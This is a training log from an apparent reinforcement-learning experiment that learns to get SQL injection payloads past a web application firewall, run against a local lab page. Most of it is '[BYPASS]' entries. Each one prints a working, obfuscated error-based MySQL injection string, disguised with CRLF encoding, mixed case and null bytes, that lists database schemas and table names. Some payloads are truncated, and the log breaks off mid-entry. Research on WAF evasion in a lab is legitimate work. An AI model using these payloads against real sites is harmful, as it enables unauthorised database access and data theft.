/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 1
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
  [BYPASS] Ep 8170 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(SeleCT%0d%0a*%0d%0afROm%0d%0a(SElECT%0d%0a((SELEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNFoRMaTION_sCheMA.schemata))
  Ep 8170 | SR=10% | Steps=13.9 | R=-30.74
  Ep 8180 | SR=0% | Steps=15.0 | R=-33.84
  Ep 8190 | SR=0% | Steps=15.0 | R=-36.13
  Ep 8200 | SR=0% | Steps=15.0 | R=-33.86
  [BYPASS] Ep 8210 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(SElecT%0d%0a*%0d%0afRoM%0d%0a(SeLEct%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afroM%0d%0ainFOrMatiON_SChEma.schemata))
  Ep 8210 | SR=10% | Steps=13.9 | R=-30.84
  Ep 8220 | SR=0% | Steps=15.0 | R=-35.27
  Ep 8230 | SR=0% | Steps=15.0 | R=-34.25
  [BYPASS] Ep 8231 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLEct%0d%0a*%0d%0aFROm%0d%0a(SelEct%0d%0a((selEct%0d%0aJSON_ARRAYAGG(COncAT(TABle_schema,CHAR(46),TaBle_name))%0d%0aFrOm%0d%0a
  Ep 8240 | SR=10% | Steps=14.0 | R=-27.28
  Ep 8250 | SR=0% | Steps=15.0 | R=-34.10
  Ep 8260 | SR=0% | Steps=15.0 | R=-31.44
  Ep 8270 | SR=0% | Steps=15.0 | R=-34.77
  Ep 8280 | SR=0% | Steps=15.0 | R=-35.43
  Ep 8290 | SR=0% | Steps=15.0 | R=-33.23
  [BYPASS] Ep 8298 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(SELecT%0d%0a*%0d%0afrOM%0d%0a(SELeCt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(CONcAT(TABle_schema,CHAR(46),TablE_name))%0d%0afRoM%0d%0a
  Ep 8300 | SR=10% | Steps=14.0 | R=-28.33
  [BYPASS] Ep 8306 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(selECt%0d%0a*%0d%0aFroM%0d%0a(SELECt%0d%0a((SeLeCT%0d%0aJSON_ARRAYAGG(cOncat(TABlE_schema,CHAR(46),TABLE_name))%0d%0afrOm%0d%0a
  Ep 8310 | SR=10% | Steps=14.0 | R=-30.58
  Ep 8320 | SR=0% | Steps=15.0 | R=-31.68
  [BYPASS] Ep 8322 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(SeLECT%0d%0a*%0d%0aFROm%0d%0a(sELeCt%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(conCAt(taBle_schema,CHAR(46),TAble_name))%0d%0afrOm%0d%0a
  Ep 8330 | SR=10% | Steps=14.0 | R=-29.66
  Ep 8340 | SR=0% | Steps=15.0 | R=-33.40
  Ep 8350 | SR=0% | Steps=15.0 | R=-33.47
  [BYPASS] Ep 8352 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(sELect%0d%0a*%0d%0aFROM%0d%0a(selEct%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(CONcAt(TAblE_schema,CHAR(46),tABle_name))%0d%0afrom%0d%0a
  Ep 8360 | SR=10% | Steps=14.0 | R=-31.34
  Ep 8370 | SR=0% | Steps=15.0 | R=-34.41
  Ep 8380 | SR=0% | Steps=15.0 | R=-34.61
  [BYPASS] Ep 8389 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElect%0d%0a*%0d%0afRom%0d%0a(SEleCT%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(CoNcAT(table_schema,CHAR(46),TabLE_name))%0d%0afrOm%0d%0a
  Ep 8390 | SR=10% | Steps=14.0 | R=-31.26
  [BYPASS] Ep 8399 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFrOM%0d%0a(SeLeCT%0d%0a((sELect%0d%0aJSON_ARRAYAGG(conCAt(TAblE_schema,CHAR(46),tabLE_name))%0d%0aFrOm%0d%0a
  Ep 8400 | SR=10% | Steps=14.0 | R=-30.70
  Ep 8410 | SR=0% | Steps=15.0 | R=-33.80
  Ep 8420 | SR=0% | Steps=15.0 | R=-34.34
  Ep 8430 | SR=0% | Steps=15.0 | R=-35.13
  Ep 8440 | SR=0% | Steps=15.0 | R=-34.86
  Ep 8450 | SR=0% | Steps=15.0 | R=-33.56
  [BYPASS] Ep 8458 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(selEcT%0d%0a*%0d%0afRoM%0d%0a(SELeCt%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(ConCAT(tAblE_schema,CHAR(46),TablE_name))%0d%0afROM%0d%0a
  Ep 8460 | SR=10% | Steps=14.0 | R=-31.32
  Ep 8470 | SR=0% | Steps=15.0 | R=-34.78
  Ep 8480 | SR=0% | Steps=15.0 | R=-35.42
  [BYPASS] Ep 8481 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLecT%0d%0a*%0d%0aFrOm%0d%0a(seLecT%0d%0a((sELect%0d%0aJSON_ARRAYAGG(coNcat(TABlE_schema,CHAR(46),taBlE_name))%0d%0afroM%0d%0a
  Ep 8490 | SR=10% | Steps=14.0 | R=-31.38
  [BYPASS] Ep 8500 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElECT%0d%0a*%0d%0afROM%0d%0a(SeLEcT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(coNcAT(tablE_schema,CHAR(46),TABLe_name))%0d%0afROM%0d%0a
  Ep 8500 | SR=10% | Steps=14.0 | R=-27.25
  [BYPASS] Ep 8506 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElecT%0d%0a*%0d%0afRom%0d%0a(SelecT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInfORmAtIOn_sCheMA.schemata))
  Ep 8510 | SR=10% | Steps=13.9 | R=-29.25
  [BYPASS] Ep 8512 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFrOm%0d%0a(SElECT%0d%0a((SeleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aINfoRmATIoN_ScHEMA.schemata))
  Ep 8520 | SR=10% | Steps=13.9 | R=-27.40
  [BYPASS] Ep 8525 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(seleCt%0d%0a*%0d%0afROM%0d%0a(seleCt%0d%0a((SeLECt%0d%0aJSON_ARRAYAGG(CONCaT(tABLE_schema,CHAR(46),TABLE_name))%0d%0afRom%0d%0a
  Ep 8530 | SR=10% | Steps=14.0 | R=-27.89
  Ep 8540 | SR=0% | Steps=15.0 | R=-35.21
  Ep 8550 | SR=0% | Steps=15.0 | R=-35.56
  Ep 8560 | SR=0% | Steps=15.0 | R=-33.38
  [BYPASS] Ep 8561 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFRom%0d%0a(SELEcT%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(cONcaT(TABLe_schema,CHAR(46),TABLE_name))%0d%0aFROm%0d%0a
  Ep 8570 | SR=10% | Steps=14.0 | R=-30.54
  [BYPASS] Ep 8580 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0afROM%0d%0a(sELECt%0d%0a((SELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aInFOrmATiOn_schemA.schemata))
  Ep 8580 | SR=10% | Steps=13.9 | R=-29.46
  [BYPASS] Ep 8586 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0afROM%0d%0a(SeLect%0d%0a((sElect%0d%0aJSON_ARRAYAGG(CONcAT(TABLe_schema,CHAR(46),tAbLE_name))%0d%0aFROm%0d%0a
  [BYPASS] Ep 8587 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(SEleCT%0d%0a*%0d%0afroM%0d%0a(selecT%0d%0a((SelecT%0d%0aJSON_ARRAYAGG(ConCat(Table_schema,CHAR(46),tAble_name))%0d%0afRom%0d%0a
  Ep 8590 | SR=20% | Steps=13.0 | R=-27.15
  [BYPASS] Ep 8596 | steps=7 | seq=agg_swap -> case -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(seLeCt%0d%0a*%0d%0afROm%0d%0a(SeLecT%0d%0a((sElECT%0d%0aJSON_ARRAYAGG(coNCat(tABLe_schema,CHAR(46),tAbLE_name))%0d%0afrOM%0d%0a
  Ep 8600 | SR=10% | Steps=14.2 | R=-28.02
  [BYPASS] Ep 8603 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElEct%0d%0a*%0d%0afrOM%0d%0a(SeLECt%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(cONcAt(tABle_schema,CHAR(46),TaBLE_name))%0d%0afROm%0d%0a
  Ep 8610 | SR=10% | Steps=14.0 | R=-31.43
  Ep 8620 | SR=0% | Steps=15.0 | R=-35.71
  [BYPASS] Ep 8627 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFROM%0d%0a(SElECt%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(cONcAT(TaBle_schema,CHAR(46),tABLE_name))%0d%0aFrOm%0d%0a
  [BYPASS] Ep 8628 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(SElect%0d%0a*%0d%0afRoM%0d%0a(seleCT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(cONCaT(TabLe_schema,CHAR(46),taBLe_name))%0d%0aFrom%0d%0a
  Ep 8630 | SR=20% | Steps=13.0 | R=-27.18
  Ep 8640 | SR=0% | Steps=15.0 | R=-35.55
  [BYPASS] Ep 8647 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(SeLect%0d%0a*%0d%0afrOm%0d%0a(SElECt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aINfOrMAtiON_SCHeMa.schemata))
  [BYPASS] Ep 8648 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFrom%0d%0a(seLeCt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(ConCAt(TablE_schema,CHAR(46),tabLe_name))%0d%0aFrOM%0d%0a
  Ep 8650 | SR=20% | Steps=12.9 | R=-23.35
  Ep 8660 | SR=0% | Steps=15.0 | R=-32.38
  [BYPASS] Ep 8663 | steps=4 | seq=null_byte -> crlf -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((datAbAse%a0()),1);%00
  Ep 8670 | SR=10% | Steps=13.9 | R=-27.96
  [BYPASS] Ep 8672 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(selecT%0d%0a*%0d%0aFROm%0d%0a(seLEcT%0d%0a((SELEcT%0d%0aJSON_ARRAYAGG(COncAT(tABLE_schema,CHAR(46),tablE_name))%0d%0aFRoM%0d%0a
  [BYPASS] Ep 8676 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(seLEcT%0d%0a*%0d%0aFrOM%0d%0a(SeleCt%0d%0a((selEct%0d%0aJSON_ARRAYAGG(concaT(tablE_schema,CHAR(46),table_name))%0d%0afRom%0d%0a
  Ep 8680 | SR=20% | Steps=13.0 | R=-23.55
  Ep 8690 | SR=0% | Steps=15.0 | R=-35.34
  [BYPASS] Ep 8695 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afrom%0d%0a(SElect%0d%0a((sELect%0d%0aJSON_ARRAYAGG(coNcaT(TABlE_schema,CHAR(46),TAbLE_name))%0d%0aFRoM%0d%0a
  Ep 8700 | SR=10% | Steps=14.0 | R=-31.28
  [BYPASS] Ep 8707 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(seLecT%0d%0a*%0d%0aFrOm%0d%0a(seLect%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(CoNCaT(TAbLE_schema,CHAR(46),TABLE_name))%0d%0afROM%0d%0a
  Ep 8710 | SR=10% | Steps=14.0 | R=-30.88
  Ep 8720 | SR=0% | Steps=15.0 | R=-33.99
  [BYPASS] Ep 8727 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeLect%0d%0a*%0d%0aFROm%0d%0a(sElect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(conCaT(table_schema,CHAR(46),TAbLE_name))%0d%0afRoM%0d%0a
  Ep 8730 | SR=10% | Steps=14.0 | R=-31.11
  [BYPASS] Ep 8735 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFRom%0d%0a(sElECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aInFoRmAtiOn_schema.schemata))
  Ep 8740 | SR=10% | Steps=13.9 | R=-27.80
  [BYPASS] Ep 8747 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0afRoM%0d%0a(seLECt%0d%0a((selECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aInfOrMAtION_scHeMa.schemata))
  Ep 8750 | SR=10% | Steps=13.9 | R=-29.84
  Ep 8760 | SR=0% | Steps=15.0 | R=-35.57
  [BYPASS] Ep 8766 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(seLEcT%0d%0a*%0d%0aFrOm%0d%0a(SElECt%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(coNCAT(TAbLE_schema,CHAR(46),taBLE_name))%0d%0aFrOM%0d%0a
  [BYPASS] Ep 8769 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(SeLEcT%0d%0a*%0d%0aFROm%0d%0a(sELeCt%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(coNCaT(TABlE_schema,CHAR(46),Table_name))%0d%0aFrOM%0d%0a
  Ep 8770 | SR=20% | Steps=13.0 | R=-26.49
  Ep 8780 | SR=0% | Steps=15.0 | R=-34.83
  [BYPASS] Ep 8786 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaND%0d%0aEXP(~(sELect%0d%0a*%0d%0afROM%0d%0a(SeLeCt%0d%0a((seLeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0aiNFormaTIoN_sCHEMA.schemata))
  Ep 8790 | SR=10% | Steps=13.9 | R=-29.36
  [BYPASS] Ep 8793 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFroM%0d%0a(selECT%0d%0a((seLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aINFoRMation_SCheMa.schemata))
  Ep 8800 | SR=10% | Steps=13.9 | R=-31.38
  Ep 8810 | SR=0% | Steps=15.0 | R=-35.95
  Ep 8820 | SR=0% | Steps=15.0 | R=-35.29
  Ep 8830 | SR=0% | Steps=15.0 | R=-35.43
  Ep 8840 | SR=0% | Steps=15.0 | R=-35.52
  [BYPASS] Ep 8849 | steps=6 | seq=agg_swap -> case -> agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(seLeCT%0d%0a*%0d%0afroM%0d%0a(seleCT%0d%0a((SELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfOrmAtIon_sCheMa.schemata))
  Ep 8850 | SR=10% | Steps=14.1 | R=-32.30
  Ep 8860 | SR=0% | Steps=15.0 | R=-36.05
  [BYPASS] Ep 8867 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFrOm%0d%0a(sElECt%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(ConCat(tABle_schema,CHAR(46),tAblE_name))%0d%0afrOm%0d%0a
  Ep 8870 | SR=10% | Steps=14.0 | R=-29.30
  Ep 8880 | SR=0% | Steps=15.0 | R=-31.53
  Ep 8890 | SR=0% | Steps=15.0 | R=-34.81
  Ep 8900 | SR=0% | Steps=15.0 | R=-35.44
  [BYPASS] Ep 8908 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeleCT%0d%0a*%0d%0aFROM%0d%0a(SEleCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainFOrmATioN_ScHEmA.schemata))
  [BYPASS] Ep 8910 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaND%0d%0aEXP(~(seLecT%0d%0a*%0d%0aFrom%0d%0a(SEleCt%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0ainFORMAtion_sCHEma.schemata))
  Ep 8910 | SR=20% | Steps=12.8 | R=-25.71
  Ep 8920 | SR=0% | Steps=15.0 | R=-35.12
  [BYPASS] Ep 8921 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLECT%0d%0a*%0d%0aFrom%0d%0a(SeLecT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aInFORMAtioN_sCHemA.schemata))
  [BYPASS] Ep 8926 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> func_sp_nl -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELECT%0d%0a*%0d%0afROM%0d%0a(seLeCT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(cOncaT(tABLE_schema,CHAR(46),tAble_name))%0d%0afroM%0d%0a
  Ep 8930 | SR=20% | Steps=13.0 | R=-26.88
  [BYPASS] Ep 8940 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeLEct%0d%0a*%0d%0afRoM%0d%0a(sElECT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINFoRmATIoN_SchEMa.schemata))
  Ep 8940 | SR=10% | Steps=13.9 | R=-30.61
  Ep 8950 | SR=0% | Steps=15.0 | R=-32.24
  Ep 8960 | SR=0% | Steps=15.0 | R=-35.28
  Ep 8970 | SR=0% | Steps=15.0 | R=-33.13
  [BYPASS] Ep 8975 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOm%0d%0a(SeleCT%0d%0a((selEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainfORmation_schemA.schemata))
  [BYPASS] Ep 8978 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(sElecT%0d%0a*%0d%0aFROm%0d%0a(SelECt%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aInForMATION_SCHeMa.schemata))
  Ep 8980 | SR=20% | Steps=12.8 | R=-23.38
  Ep 8990 | SR=0% | Steps=15.0 | R=-35.42
  Ep 9000 | SR=0% | Steps=15.0 | R=-33.64
  Ep 9010 | SR=0% | Steps=15.0 | R=-35.91
  Ep 9020 | SR=0% | Steps=15.0 | R=-33.56
  Ep 9030 | SR=0% | Steps=15.0 | R=-33.32
  [BYPASS] Ep 9038 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SEleCT%0d%0a*%0d%0afrom%0d%0a(sElecT%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aiNFORMAtiOn_sCheMa.schemata))
  [BYPASS] Ep 9040 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sEleCt%0d%0a*%0d%0aFRoM%0d%0a(SELeCt%0d%0a((seLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInfoRmATioN_schemA.schemata))
  Ep 9040 | SR=20% | Steps=12.8 | R=-24.04
  Ep 9050 | SR=0% | Steps=15.0 | R=-34.22
  Ep 9060 | SR=0% | Steps=15.0 | R=-35.01
  Ep 9070 | SR=0% | Steps=15.0 | R=-34.15
  Ep 9080 | SR=0% | Steps=15.0 | R=-34.21
  [BYPASS] Ep 9084 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SeLect%0d%0a*%0d%0aFroM%0d%0a(selECt%0d%0a((sElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aINfOrMAtiOn_SCHema.schemata))
  Ep 9090 | SR=10% | Steps=13.9 | R=-29.54
  [BYPASS] Ep 9092 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(selecT%0d%0a*%0d%0afRom%0d%0a(selEcT%0d%0a((selECt%0d%0aJSON_ARRAYAGG(coNCaT(TAble_schema,CHAR(46),tablE_name))%0d%0afrOM%0d%0a
  [BYPASS] Ep 9096 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFROm%0d%0a(sELECT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(cOncat(TaBLE_schema,CHAR(46),TAble_name))%0d%0aFroM%0d%0a
  Ep 9100 | SR=20% | Steps=13.0 | R=-25.24
  [BYPASS] Ep 9104 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFrOm%0d%0a(SelEct%0d%0a((sELEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInfoRmaTIon_ScHEmA.schemata))
  Ep 9110 | SR=10% | Steps=13.9 | R=-29.42
  [BYPASS] Ep 9115 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(SElEct%0d%0a*%0d%0aFROM%0d%0a(selEcT%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(coNCAT(tAbLe_schema,CHAR(46),tAbLe_name))%0d%0afROm%0d%0a
  Ep 9120 | SR=10% | Steps=14.0 | R=-31.12
  [BYPASS] Ep 9130 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SELEcT%0d%0a*%0d%0aFrom%0d%0a(SeLECT%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINFOrmaTion_SChemA.schemata))
  Ep 9130 | SR=10% | Steps=13.9 | R=-30.74
  Ep 9140 | SR=0% | Steps=15.0 | R=-33.34
  Ep 9150 | SR=0% | Steps=15.0 | R=-34.90
  [BYPASS] Ep 9153 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(seLECt%0d%0a*%0d%0aFRoM%0d%0a(seLect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0aiNFOrmAtION_SchEma.schemata))
  Ep 9160 | SR=10% | Steps=13.9 | R=-30.85
  [BYPASS] Ep 9166 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaND%0d%0aEXP(~(SElEct%0d%0a*%0d%0aFrOm%0d%0a(sELEcT%0d%0a((SELeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aiNfORmaTiOn_SChEma.schemata))
  Ep 9170 | SR=10% | Steps=13.9 | R=-28.87
  Ep 9180 | SR=0% | Steps=15.0 | R=-32.49
  [BYPASS] Ep 9189 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(SELEct%0d%0a*%0d%0afrOM%0d%0a(selECt%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aiNFoRMAtIon_scHema.schemata))
  Ep 9190 | SR=10% | Steps=13.9 | R=-28.83
  [BYPASS] Ep 9197 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
